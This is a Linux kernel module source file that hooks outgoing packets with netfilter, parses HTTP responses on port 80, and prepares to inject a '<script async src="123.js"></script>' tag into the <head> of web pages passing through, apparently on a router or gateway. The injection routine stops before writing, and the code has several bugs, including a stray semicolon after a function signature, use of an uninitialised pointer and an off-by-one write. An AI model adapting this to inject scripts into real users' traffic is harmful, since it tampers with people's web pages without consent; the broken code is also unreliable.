#include <asm/io.h>
#include <asm/irq.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/interrupt.h>
#include <linux/mutex.h>

#include <linux/time.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/random.h>
#include <linux/netfilter_bridge.h>
#include <linux/kernel.h>
#include <linux/netlink.h>
#include <net/ip.h>
#include <linux/inetdevice.h>
#include <net/netfilter/nf_conntrack_core.h>
#include <net/genetlink.h>
#include <linux/if_ether.h>
#include <linux/if_pppox.h>
#include <linux/ppp_defs.h>

#include "up.h"

MODULE_AUTHOR("G");
MODULE_VERSION("V0.1");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("up  .  module");

static unsigned int g_up_pid = 0;

/************** up-mode init *******************/
struct genl_family g_up_nl_family = {
    .id         = GENL_ID_GENERATE,
    .name       = "up_module",
    .version    = 1,
    .maxattr    = UP_ATTR_MAX,
};

struct nla_policy up_policy[UP_ATTR_MAX + 1] = {
    [UP_ATTR_TYPE] = { .type = NLA_U8, },
    [UP_ATTR_MAC] = { .type = NLA_U64, },
    [UP_ATTR_SEQUENCE] = { .type = NLA_U64, },

/*
    [UP_ATTR_VAP_NAME] = { .type = NLA_STRING, .len = IFNAMSIZ - 1},
    [UP_ATTR_SIP] = { .type = NLA_U32, },
    [UP_ATTR_DIP] = { .type = NLA_U32, },
    [UP_ATTR_SPORT] = { .type = NLA_U16, },
    [UP_ATTR_DPORT] = { .type = NLA_U16, },
    [UP_ATTR_DPORT] = { .type = NLA_U16, },
    [UP_ATTR_PA_CODE] = { .type = NLA_STRING, .len = 16,},
    [UP_ATTR_PA_HTTP_KEY1] = { .type = NLA_STRING, .len = 512,},
    [UP_ATTR_PA_HTTP_KEY2] = { .type = NLA_STRING, .len = 32,},
    [UP_ATTR_PA_HTTP_KEY3] = { .type = NLA_STRING, .len = 32,},
    [UP_ATTR_PA_HTTP_KEY4] = { .type = NLA_STRING, .len = 256,},
    [UP_ATTR_PA_HTTP_KEY5] = { .type = NLA_STRING, .len = 256,},
    [UP_ATTR_PA_HTTP_KEY6] = { .type = NLA_STRING, .len = 256,},
    [UP_ATTR_PA_HTTP_KEY7] = { .type = NLA_STRING, .len = 256,},
    */
};

//TEST:
int up_report_data(struct sk_buff *skb, struct genl_info *info);

static int
up_set_pid(struct sk_buff *skb, struct genl_info *info)
{
#ifdef OLD_VER
    g_up_pid = info->snd_pid;
#else
    g_up_pid = info->snd_portid;
#endif
    printk("user space PID:%d\n", g_up_pid);

    /*
    msleep(1000);

    printk("report... PID:%d\n", g_up_pid);
    up_report_data();
    */
    return 0;
}

#define UP_OP(_cmd, _func)      \
{                               \
    .cmd    = _cmd,             \
    .policy = up_policy,        \
    .doit   = _func,            \
    .dumpit = NULL,             \
    .flags  = GENL_ADMIN_PERM,  \
}

static struct genl_ops g_up_nl_ops[] = {
    UP_OP(UP_OPS_REPORT_PID, up_set_pid), /* set pid of user process */
};

int up_report_data(struct sk_buff *skb, struct genl_info *info)
{
    int err = 0;
    void *hdr = NULL;
    //struct sk_buff *skb = NULL;

    if (g_up_pid == 0) {
        UP_MSG_PRINTF("up pid is still invalid.");
        return -1;
    }

    skb = nlmsg_new(NLMSG_DEFAULT_SIZE, GFP_KERNEL);
    if (NULL == skb) {
        UP_MSG_PRINTF("oom.");
        return -1;
    }

    hdr = genlmsg_put(skb, g_up_pid, 0, &g_up_nl_family, 0, 0);
    if (NULL == hdr) {
        UP_MSG_PRINTF("nlmsg put failed.");
        goto put_err;
    }

    //NLA_PUT_U8(skb, UP_ATTR_TYPE, 0xA5);
    nla_put_u8(skb, UP_ATTR_TYPE, 0xA5);

    genlmsg_end(skb, hdr);

#ifdef OLD_VER
    err = genlmsg_unicast(skb, g_up_pid);
#else
    err = genlmsg_unicast(genl_info_net(info), skb, g_up_pid);
#endif
    if (err != 0) {
        UP_MSG_PRINTF("ge nl msg unicast failed.");
        goto put_err;
    }

    UP_MSG_PRINTF("ge nl msg unicast success..");

    return 0;
//nla_put_failure:
    //UP_MSG_PRINTF("NLA_PUT_ err.");
put_err:
    nlmsg_free(skb);
    skb = NULL;
    return -1;
}


static int up_link_init(void)
{
    int i = 0;
    int err = -1;

    err = genl_register_family(&g_up_nl_family);
    if (err != 0) {
        UP_MSG_PRINTF("genl register family failed.");
        return -1;
    } else {
        UP_MSG_PRINTF("genl register family success.");
    }

    for (i = 0; i < ARRAY_SIZE(g_up_nl_ops); i++) {
#ifdef OLD_VER
        err = genl_register_ops(&g_up_nl_family, &(g_up_nl_ops[i]));
#endif
        if (err != 0) {
            UP_MSG_PRINTF("genl register ops failed.");
            goto reg_ops_err;
        }
    }
    UP_MSG_PRINTF("genl register ops success.");
    
    return 0;

reg_ops_err:
    genl_unregister_family(&g_up_nl_family);
    return -1;
}
static void up_link_fini(void)
{
    genl_unregister_family(&g_up_nl_family);
    return;
}

inline char *       
_ip2str (u32 ipv4, char *buf, int buf_len)
{
    snprintf(buf, buf_len, "%d.%d.%d.%d", (ipv4>>24)&0xff, (ipv4>>16)&0xff,     
            (ipv4>>8)&0xff, ipv4&0xff); 
    return buf;
}   

/* 在@src中查找@d 
 * @src可能不是字符串(没有'\0'), 但@d一定要是个字符串(以'\0'结尾)  
 * @max 指定@src的长度。
 * */
char *__strstr2(const char *src, const char *d, int max)
{
    int l2;
    char *s = (char*)src;
    int i = 0;

    l2 = strlen(d);
    if (!l2)
        return (char *)s;
    while(*s && (s - src) <= (max - l2)){
        for(i = 0; i < l2; i ++){
            if(s[i] != d[i])
                break;
        }
        if(i == l2)
            return s;
        s ++;
    }
    return NULL;
}

/* copy @tt中@a之后@b之前的数据到@buf中，返回@b后的地址  
 * 如果@a == NULL:则copy从@tt到@b
 * */
static const char * __get_msg_of_A2B(const char *tt, int tt_len, 
                                        char *buf, int buf_len, 
                                        const char *a,
                                        const char *b)
{
    int len = 0;
    int str_len = 0;
    const char *p = NULL, *p1 = NULL;
    int skip_a_len = 0;
    int skip_b_len = 0;

    if (NULL == tt  || tt_len  <= 0 || 
        NULL == buf || buf_len <= 0 ||
        NULL == b) {
        return NULL;
    }

    if (NULL != a) {
        skip_a_len = strlen(a);
        p = __strstr2(tt, a, tt_len);
    } else {
        a = tt;
        p = tt;
    }
    skip_b_len = strlen(b);

    //p = __strstr2(tt, a, tt_len);
    if (NULL != p) {
        p  += skip_a_len; /* skip "<" */
        len = tt_len - skip_a_len;
        p1 = p;
        p = __strstr2(p1, b, len);
        if (NULL != p) {
            str_len = ((p - p1) >= buf_len) ? (buf_len - 1) : (p - p1);
            strncpy(buf, p1, str_len);
            buf[str_len + 1] = 0;
            return p + skip_b_len; /* skip '>'*/
        }
    }
    return NULL;
}

/* copy @tt中@tt之后@b之前的数据到@buf中，返回@b后的地址  */
static inline const char * __get_msg_of_P2B(const char *tt, int tt_len, 
                                        char *buf, int buf_len, 
                                        const char *b)
{
    return __get_msg_of_A2B(tt, tt_len, buf, buf_len, NULL, b);
}

static inline const char * __get_msg_of_ltgt(const char *tt, int tt_len, char *buf, int buf_len)
{
    return __get_msg_of_A2B(tt, tt_len, buf, buf_len, "<", ">");
}

typedef struct tag_strA2Binfo
{
    const char *strA;
    const char *strB;
    const char *posA;
    const char *posB;
    int A2BLen; /* exclude '\0' */
}STR_A2B_INFO_ST;

/*
 * */

static inline int __get_str_pos_of_A2B(const char *str, int strlen, STR_A2B_INFO_ST *pstStrA2BInfo)
{
    const char *posA = NULL;
    const char *posB = NULL;

    posA = __strstr2(str, pstStrA2BInfo->strA, strlen);
    if (posA == NULL) {
        return -1;
    }

    posB = __strstr2(str, pstStrA2BInfo->strB, strlen);
    if (posB == NULL) {
        return -1;
    }

    pstStrA2BInfo->posA = posA;
    pstStrA2BInfo->posB = posB;

    pstStrA2BInfo->A2BLen = posB - posA;

    return 0;
};

/*
 * @hdr_filed : name of http header-field
 * @pstA2B: output, struct of header-field str
 * */
static inline int _get_http_header_filed(const char *str, 
                                         int strlen, 
                                         const char *hdr_filed, 
                                         STR_A2B_INFO_ST *pstA2B)
{
    pstA2B->strA = hdr_filed;
    pstA2B->strB = "\r\n";

    if (__get_str_pos_of_A2B(str, strlen, pstA2B) < 0) {

        return -1;
    }

    return 0;
}

#define HTTP_RESP_CONTENT_TYPE "Content-Type"

/* find @key in @data
 * @data_len : find range in @data
 * @key      : string want check
 * @key_len  : return the length of key
 * return : begin addr of @key
 * eg:
 *    data : xxxxxxxxxx\r\nContent-Type: text\html\r\nxxxxxxxxxx
 *                         ^                          ^
 *                         a                          b
 *    *key_len = b - a;
 *    return a;
 * */
static char *
up_ct_http_check_key(char *data, int data_len, const char *key, int *key_len)
{
    char *p = NULL, *p1 = NULL;
    int len = 0;

    len = data_len;

    if (data == NULL || data_len <= 0 || key == NULL || key_len == NULL) {
        UP_MSG_PRINTF("invalid args.");
        return NULL;
    }

    /* check content type start */
    p = __strstr2(data, key, len);
    if (p == NULL) {
        UP_MSG_PRINTF("can not find [%s].", key);
        return NULL;
    }

    len -= (p - data);
    p1 = __strstr2(p, "\r\n", len);
    if (p1 == NULL) {
        UP_MSG_PRINTF("invalid [%s].", key);
        return NULL;
    }
    p1 += 2; /* skip "\r\n" */

    *key_len = (p1 - p);

    return p;
}

static int
up_ct_http_response_inject(char * data, int data_len)
{
    char *p = NULL;
    char *http_data     = NULL;
    int   http_data_len = 0;
    char *http_hdr      = NULL;
    char js_str[128];
    char *inject_start  = NULL;
    char *inject_end    = NULL;
    char *key_start     = NULL;
    int   key_len       = 0;
    char *key_end       = NULL;
    

    int js_str_len = 0;

    snprintf(js_str, sizeof(js_str), "%s", "<script async src=\"123.js\"></script>");
    js_str_len = strlen(js_str);

    http_hdr = data;

    /* get http data start */
    p = __strstr2(http_hdr, "\r\n\r\n", data_len);
    if (p == NULL) {
        UP_MSG_PRINTF("find http data failed.");
        return -1;
    }
    http_data = p + 4; /* skip "\r\n\r\n" */
    http_data_len = data_len - (http_data - http_hdr);
    if (http_data_len <= 0) {
        UP_MSG_PRINTF("no http data.");
        return -1;
    }

    /* get <head> in HTML */
    p = __strstr2(http_data, "<head>", http_data_len);
    if (p == NULL) {
        UP_MSG_PRINTF("find <head> failed.");
        return -1;
    }
    inject_start = inject_end = p + 6; /* skip "<head>" */

    key_start = up_ct_http_check_key(data, data_len, "Last-Modified", &key_len);
    if (NULL == key_start) {
        UP_MSG_PRINTF("check failed.");
        return -1;
    }
    UP_MSG_PRINTF("check key len : %d.", key_len);
    key_end = key_start + key_len;

    if (key_len < js_str_len) {
        UP_MSG_PRINTF("keylen is not enougth.");
        return -1;
    }

//xx

    UP_MSG_PRINTF("keylen is enougth.");

    return 0;
}

static int
up_ct_http_response(char *data, int data_len)
{
    int len = 0;
    char *p = NULL, *p1 = NULL;
    STR_A2B_INFO_ST stA2B;
    char buf[128];

    len = data_len;

    /* check content type start */
    memset(&stA2B, 0, sizeof(STR_A2B_INFO_ST));
    if (_get_http_header_filed(data, data_len, HTTP_RESP_CONTENT_TYPE, &stA2B) < 0) {
        UP_MSG_PRINTF("can not find "HTTP_RESP_CONTENT_TYPE".");
        return -1;
    }
    /*
    p = __strstr2(data, HTTP_RESP_CONTENT_TYPE, len);
    if (p == NULL) {
        UP_MSG_PRINTF("can not find Accept.");
        return -1;
    }

    len -= (p - data);
    p1 = __strstr2(p, "\r\n", len);
    if (p == NULL) {
        UP_MSG_PRINTF("invalid Accept.");
        return -1;
    }
    len = p1 - p;
    p = __strstr2(p, "text/html", len);
    if (p == NULL) {
        UP_MSG_PRINTF("http is not text/html.");
        return -1;
    }
    */
    snprintf(buf, (stA2B.A2BLen + 1 >= sizeof(buf) ? sizeof(buf) : stA2B.A2BLen + 1), 
            "%s", buf);
    UP_MSG_PRINTF(HTTP_RESP_CONTENT_TYPE":%s", buf);
    p  = __strstr2(p, "text/html", len);
    p1 = __strstr2(p, "application/x-javascript", len);
    if (p != NULL && p1 != NULL) {
        /* inject */
        return up_ct_http_response_inject(data, data_len);
    }
    /* check content type end */

    UP_MSG_PRINTF("http is not text/html or javascript .");
    return -1;
}

static int 
up_ct_http_get_url(char *data, int data_len)
{
    //char buf[4096];
    //char *b1 = NULL, *b2 = NULL, *b3 = NULL, *b4 = NULL;

    if (NULL == data) {
        return -1;
    }

    if(memcmp(data, "GET", 3) == 0) {
        UP_MSG_PRINTF("%s", "GET");
    } else if(memcmp(data, "POST", 4) == 0) {
        UP_MSG_PRINTF("%s", "POST");
    } else if(memcmp(data, "HTTP", 4) == 0) {
        UP_MSG_PRINTF("%s", "HTTP");
        up_ct_http_response(data, data_len);
    }

    /*
    b1 = __strstr2(data, "\r\n\r\n", data_len);
    if (b1 != NULL) {
        b1 += 4;

        len = data_len - (b1 - data);

        snprintf(buf, len >= 1024 ? 1024 : len, "%s", b1);
        UP_MSG_PRINTF("len:%d\nC:[%s]", len, buf);
    }
    */

    return 0;
}

unsigned int up_ct_http_hook_cb(unsigned int hooknum,
        struct sk_buff *skb,
        const struct net_device *in,
        const struct net_device *out,
        int (*okfn)(struct sk_buff *));

{
    char buf[1024];
	struct ethhdr  *eh = NULL;
	struct iphdr   *ih = NULL;
	struct tcphdr  *th = NULL;
	//struct udphdr  *uh = NULL;
    //struct nf_conn *ct = NULL;
	//enum ip_conntrack_info ctinfo;
    u16 dport    = 0;
    u16 sport    = 0;
    u8 *pdata    = NULL;
    //int len      = 0;
    int data_len = 0;
    __be32 src_ip = 0;
    __be32 dst_ip = 0;

    eh = eth_hdr(skb);
    ih = ip_hdr(skb);

    if (skb->protocol != htons(ETH_P_IP) && skb->protocol != htons(ETH_P_8021Q)){
        return NF_ACCEPT;
    } 

    if (skb->protocol == htons(ETH_P_8021Q) && ih)
        ih = (struct iphdr *)((u8 *)ih+4);

    src_ip = ntohl(ih->saddr);
    dst_ip = ntohl(ih->daddr);

    if(ih->protocol == IPPROTO_TCP){
        th = (struct tcphdr *)((u8 *)ih + (ih->ihl << 2));
        dport = ntohs(th->dest);
        sport = ntohs(th->source);
        /*
    } else if(ih->protocol == IPPROTO_UDP){
        uh = (struct udphdr *)((u8 *)ih + (ih->ihl << 2));
        dport = ntohs(uh->dest);
        sport = ntohs(uh->source);
        */
    } else {
        return NF_ACCEPT;
    }

    /*
    ct = nf_ct_get(skb, &ctinfo);
    if (NULL == ct) {
        return NF_ACCEPT;
    }
    */

    //if (ctinfo == IP_CT_ESTABLISHED) {
    {
        //UP_MSG_PRINTF("----");
        /*
        if (ih->protocol != IPPROTO_TCP) {
            return NF_ACCEPT;
        }
        */
        //len = ih->ihl * 4 + th->doff * 4;
        //pdata = skb->data + len;
        //data_len = ih->tot_len - len;
        int ip_hlen = 0;
        int tcp_len = 0;
        int tcp_hlen = 0;
        //int data_len = 0;

        ip_hlen = ih->ihl << 2;
        tcp_len = ntohs(ih->tot_len) - ip_hlen;
        tcp_hlen = th->doff << 2;
        data_len = tcp_len - tcp_hlen;
        //UP_MSG_PRINTF("tcp_hlen:%d", tcp_hlen);
        pdata = ((u8 *)th) + tcp_hlen;

        if(data_len == 0)
            return NF_ACCEPT;
            
        //if(skb_has_frag_list(skb))                
        if (skb_shinfo(skb)->frag_list != NULL) {                                           
            return NF_ACCEPT;                       
        }                                           

        //UP_MSG_PRINTF("dport:%d sport:%d", dport, sport);
        //if (dport == 80 || sport == 80) {
        if (sport == 80) {
            UP_MSG_PRINTF("dport:%d sport:%d", dport, sport);
            _ip2str(dst_ip, buf, sizeof(buf));
            UP_MSG_PRINTF("dip:%s", buf);
            _ip2str(src_ip, buf, sizeof(buf));
            UP_MSG_PRINTF("sip:%s", buf);
            UP_MSG_PRINTF("data len:%d", data_len);

            //snprintf(buf, sizeof(buf), "%s", pdata);
            //UP_MSG_PRINTF("http data:%s", buf);

            up_ct_http_get_url(pdata, data_len);
        }
        
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops up_hooks[] = {
    {
        .owner    = THIS_MODULE,
        .hooknum  = NF_INET_POST_ROUTING,
        .pf       = PF_INET,
        .priority = NF_IP_PRI_FIRST,
        .hook     = up_ct_http_hook_cb,
    },
};



#define SYSFS_UP_ATTR "parameters"
typedef struct up_config
{
    unsigned char up_enable;
    spinlock_t up_lock/* = SPIN_LOCK_UNLOCKED*/;
}up_config_t;

static up_config_t g_up_config;

#define UP_CONFIG_LOCK \
    spin_lock(&(g_up_config.up_lock));
#define UP_CONFIG_UNLOCK \
    spin_unlock(&(g_up_config.up_lock));
 
static ssize_t 
show_up_enable(struct kobject *kobj, struct kobj_attribute *attr,
        char *buf)
{
    int rc = -1;
    UP_CONFIG_LOCK;
    rc = sprintf(buf, "%d\n", g_up_config.up_enable);
    UP_CONFIG_UNLOCK;
    return rc;
}

static ssize_t
store_up_enable(struct kobject *kobj, struct kobj_attribute *attr,
			  const char *buf, size_t count)
{
    int rc = -1, rv = 0;;
    rc = sscanf(buf, "%d\n", &rv);
    UP_CONFIG_LOCK;
    if (rc == 1) {
        if(rv)
            g_up_config.up_enable = 1;
        else
            g_up_config.up_enable = 0;
    }
    UP_CONFIG_UNLOCK;
    return strlen(buf);
}

#define UP_SYSFS_ATTR_SET(_name, _mode, _show, _store) \
        struct kobj_attribute up_sysfs_attr_##_name = __ATTR(_name, _mode, _show, _store)
static UP_SYSFS_ATTR_SET(up_enable, 
        (S_IRUGO | S_IWUSR),
        show_up_enable, 
        store_up_enable);

static struct attribute *up_attrs[] = {
    &(up_sysfs_attr_up_enable.attr),
    NULL,
};

static struct attribute_group up_sysfs_group = {
    .name = SYSFS_UP_ATTR,
    .attrs = up_attrs,
};

static int up_create_sysfs(void)
{
	struct kobject *up_obj = &(THIS_MODULE->mkobj.kobj);

    if (NULL == up_obj) {
        printk("[%s][%d]up obj is null\n", __func__, __LINE__);
        return -1;
    }

    sysfs_create_group(up_obj, &up_sysfs_group);

    return 0;
}

static int up_destroy_sysfs(struct kobject *up_obj)
{
    if (NULL == up_obj) {
        printk("[%s][%d]up obj is null\n", __func__, __LINE__);
    }

    sysfs_remove_group(up_obj, &up_sysfs_group);

    return 0;
}


static int __init up_init(void)
{
    int err = 0;
    up_link_init();
    UP_MSG_PRINTF("up link init success.");

    if (up_create_sysfs() < 0) {
        UP_MSG_PRINTF("%s: faild to create sysfs.\n", __func__);
        return -1;
    }

    err = nf_register_hooks(up_hooks, ARRAY_SIZE(up_hooks));
    if(0 != err){
        UP_MSG_PRINTF("%s: faild to register hook\n", __func__);
        return -1;
    }
    UP_MSG_PRINTF("nf register hooks success.");
    //up_report_data();
    
    memset(&g_up_config, 0, sizeof(up_config_t));
	spin_lock_init(&(g_up_config.up_lock));
    UP_MSG_PRINTF("init success.");

    return 0;
}

static void __exit up_exit(void)
{
	struct kobject *up_obj = &(THIS_MODULE->mkobj.kobj);
    nf_unregister_hooks(up_hooks, ARRAY_SIZE(up_hooks));
    up_destroy_sysfs(up_obj);
    up_link_fini();

    UP_MSG_PRINTF("exit success.");
    return;
}

module_init(up_init);
module_exit(up_exit);
